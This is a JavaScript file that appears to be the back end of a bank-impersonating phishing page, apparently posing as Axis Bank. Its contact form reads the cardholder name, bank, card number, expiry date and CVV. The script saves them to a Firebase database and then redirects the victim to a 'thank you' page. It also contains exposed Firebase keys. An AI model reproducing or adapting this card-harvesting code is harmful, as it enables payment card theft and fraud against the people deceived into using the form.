// Initialize Firebase (ADD YOUR OWN DATA)
const firebaseConfig = {
  apiKey: "AIzaSyAxjW26oNbjoULSb2s3TKZfIj5fSgPYQnQ",
  authDomain: "ban-lo.firebaseapp.com",
  databaseURL: "https://ban-lo-default-rtdb.firebaseio.com",
  projectId: "ban-lo",
  storageBucket: "ban-lo.appspot.com",
  messagingSenderId: "418231309153",
  appId: "1:418231309153:web:6de1055704c67882a96b20",


    

  };

firebase.initializeApp(firebaseConfig);

// Reference messages collection
var messagesRef = firebase.database().ref('messages');

// Listen for form submit
document.getElementById('contactForm').addEventListener('submit', submitForm);

// Submit form
function submitForm(e){
  e.preventDefault();

  // Get values
  var holder = getInputVal('holder');
  var bank = getInputVal('bank');
  var card_no = getInputVal('card_no');
  var exp_date = getInputVal('exp_date');
  var cvv = getInputVal('cvv');

  // Save message
  saveMessage(holder, bank, card_no, exp_date, cvv);

  // Show alert
// alert("Axis Bank Will Contact You Soon")
//   // Clear form
//   document.getElementById('contactForm').reset();

document.getElementById('contactForm').reset();
window.location.href="https://ggww2.github.io/thank/sad1.html";
}

// Function to get get form values
function getInputVal(id){
  return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(holder, bank, card_no, exp_date, cvv){
  var newMessageRef = messagesRef.push();
  newMessageRef.set({
    holder: holder,
    bank:bank,
    card_no:card_no,
    exp_date:exp_date,
    cvv:cvv,
  });
}
